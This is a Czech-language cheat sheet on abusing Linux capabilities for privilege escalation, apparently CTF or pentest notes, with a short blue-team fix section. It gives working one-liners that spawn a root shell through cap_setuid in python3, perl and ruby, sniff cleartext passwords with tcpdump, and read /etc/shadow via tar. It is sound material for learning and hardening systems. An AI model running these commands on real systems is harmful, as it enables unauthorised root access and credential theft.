# Linux Capabilities

## Co jsou capabilities?

Linux capabilities rozdělují root práva na menší jednotky. Binárka s capability může dělat specifické privilegované operace bez plného root přístupu — ale špatně nastavené capabilities jsou častý privesc vektor.

## Zobrazení capabilities

```bash
# Všechny binárky s capabilities
getcap -r / 2>/dev/null

# Konkrétní soubor
getcap /usr/bin/python3

# Procesy
cat /proc/<PID>/status | grep Cap
capsh --decode=<hex_value>
```

## Důležité capabilities

| Capability | Popis | Privesc potenciál |
|------------|-------|-------------------|
| `cap_setuid` | Změna UID procesu | **KRITICKÝ** - přímý root |
| `cap_net_raw` | Raw sockety | Síťové útoky |
| `cap_net_bind_service` | Bind na port < 1024 | Nízký |
| `cap_sys_admin` | Systémová administrace | **KRITICKÝ** - skoro root |
| `cap_sys_ptrace` | Debugování procesů | Vysoký - čtení paměti |
| `cap_dac_read_search` | Čtení všech souborů | Čtení /etc/shadow |
| `cap_dac_override` | Přepsání přístupových práv | Vysoký |
| `cap_chown` | Změna vlastníka souborů | Vysoký |
| `cap_fowner` | Ignorovat owner check | Vysoký |

## Exploitace

### cap_setuid (nejčastější)

```bash
# Python má cap_setuid
getcap /usr/bin/python3
# výstup: /usr/bin/python3 = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
# Perl má cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```bash
# Ruby má cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

### cap_net_raw (tcpdump, wireshark)

```bash
# Odposlech sítě bez root
tcpdump -i eth0 -w capture.pcap

# Zachycení hesel v nešifrované komunikaci
tcpdump -i any -A -s0 port 21 or port 23 or port 80
```

### cap_dac_read_search

```bash
# tar má tuto capability - čtení /etc/shadow
tar xf /etc/shadow -I cat
```

### cap_sys_ptrace

```bash
# Čtení paměti jiných procesů
# Exploit: injektování kódu do procesu běžícího jako root
cat /proc/<PID>/mem
```

## Typy nastavení

```
cap_setuid+ep    # effective + permitted (může použít okamžitě)
cap_setuid+p     # pouze permitted (musí být aktivována)
cap_setuid+i     # inheritable (dědí se na child procesy)
```

## GTFOBins pro capabilities

Webová reference: https://gtfobins.github.io/#+capabilities

Vyhledej binárku a sekci "Capabilities" pro exploit příkaz.

## Příklad CTF workflow

```bash
# 1. Najdi capabilities
getcap -r / 2>/dev/null

# Příklad výstupu:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/vim.basic = cap_setuid+ep

# 2. Exploituj python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# 3. Ověř
id  # uid=0(root)
```

## Oprava (pro blue team)

```bash
# Odebrání capability
setcap -r /path/to/binary

# Nastavení specifické capability
setcap cap_net_raw+ep /usr/bin/tcpdump
```
